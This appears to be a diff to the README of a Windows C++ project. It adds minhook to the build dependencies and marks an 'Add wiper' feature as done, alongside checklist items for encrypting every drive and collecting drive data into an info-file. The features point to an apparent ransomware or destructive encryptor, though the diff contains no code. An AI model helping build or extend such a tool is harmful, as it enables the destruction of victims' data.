@@ -43,7 +43,7 @@ And many more features are available!
 - Install the latest version of Python 3 from [here](https://www.python.org/downloads/).
 - Install the latest version of Visual Studio 2022 from [here](https://visualstudio.microsoft.com/downloads/).
 - Install the latest version of Git from [here](https://git-scm.com/download/win).
-- Install vcpkg and CryptoPP using Git Bash:
+- Install vcpkg, CryptoPP and minhook using Git Bash:
   - Open Git Bash.
   - Run the command `git clone https://github.com/microsoft/vcpkg`.
   - Run the command `./vcpkg/bootstrap-vcpkg.bat`.
@@ -70,7 +70,7 @@ And many more features are available!
 - [x] List all drives in info-file
 - [x] Option to encrypt everything of every drive
 - [x] Replace "copy and delete" with "overwrite and rename" in file encryption
-- [ ] Add wiper
+- [x] Add wiper
 - [ ] Split info-file if too big
 - [ ] Add new project: info-file sender in offline mode
 - [ ] Create new branch with external depencies for more advanced features:
